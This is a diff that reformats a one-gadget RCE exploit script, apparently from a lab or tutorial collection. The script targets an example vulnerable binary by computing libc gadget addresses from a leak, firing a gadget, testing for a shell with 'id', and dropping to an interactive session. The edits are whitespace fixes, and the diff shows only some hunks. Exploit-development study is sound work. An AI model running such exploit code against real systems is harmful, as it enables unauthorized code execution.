@@ -1,4 +1,4 @@
-﻿# One-gadget RCE exploitation - quick shell with single address
+# One-gadget RCE exploitation - quick shell with single address
 # Requires libc leak and meeting constraint conditions
 
 let binary = "./vuln_binary"  # Compile from vuln.c in examples/
@@ -44,10 +44,12 @@ print("[+] Libc base:", hex(libc_base))
 let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
 let one_gadget_offsets = [0x4f3d5, 0x4f432, 0x10a41c]
 let one_gadgets = []
-for offset in one_gadget_offsets {    push(one_gadgets, libc_base + offset)
+for offset in one_gadget_offsets {
+    push(one_gadgets, libc_base + offset)
 }
 print("[*] One-gadget addresses:")
-for i in range(len(one_gadgets)) {    print("    Gadget", i, ":", hex(one_gadgets[i]))
+for i in range(len(one_gadgets)) {
+    print("    Gadget", i, ":", hex(one_gadgets[i]))
 }
 # Try each one-gadget (usually one will work based on stack state)
 # Start with most reliable one
@@ -63,8 +65,10 @@ print("[+] One-gadget sent! Checking for shell...")
 send(conn, "id\n")
 let response = recv(conn, 1024)
 
-if "uid=" in str(response) {    print("[+] SUCCESS! Shell obtained!")
+if "uid=" in str(response) {
+    print("[+] SUCCESS! Shell obtained!")
     interactive(conn)
-} else {    print("[-] One-gadget failed, constraints not met")
+} else {
+    print("[-] One-gadget failed, constraints not met")
     print("[*] Try different gadget or adjust stack")
 }
